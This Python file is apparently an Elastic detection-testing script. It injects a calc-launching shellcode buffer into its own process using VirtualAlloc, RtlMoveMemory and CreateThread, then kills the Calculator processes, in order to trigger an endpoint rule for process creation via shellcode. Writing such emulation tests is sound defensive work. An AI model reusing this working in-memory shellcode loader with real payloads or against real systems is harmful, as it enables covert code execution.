# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata
import ctypes, sys


metadata = RtaMetadata(
    uuid="979b8d18-e266-41ad-bab4-6e68971398ea",
    platforms=["windows"],
    endpoint=[{'rule_id': '58b996a5-634c-4205-9ffa-a6f2b8ebc1ad', 'rule_name': 'Potential Process Creation via ShellCode'}],
    siem=[],
    techniques=["T1134"],
)

@common.requires_os(metadata.platforms)
    
    
def main():
   # 64bit shellcode to pop calc via WinExec
   buf = b"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2\x48\x83\xec\x20\x41\xff\xd6"

   # Convert the given buffer into a bytearray
   shellcode = bytearray(buf)

   # Set the return type of the VirtualAlloc function to an unsigned 64-bit integer
   ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

   # Allocate memory for the shellcode in the current process's address space
   ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))

   # Create a ctypes buffer from the shellcode bytearray
   buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

   # Copy the shellcode to the allocated memory using RtlMoveMemory
   ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))

   # Create a new thread to execute the shellcode
   handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))

   # Wait for the thread to finish executing the shellcode
   ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))

   # Terminate CalculatorApp.exe and Calc.exe processes using taskkill
   common.execute(["taskkill.exe", "/f", "/im", "CalculatorApp.exe"])
   common.execute(["taskkill.exe", "/f", "/im", "Calc.exe"])
if __name__ == "__main__":
    exit(main())  
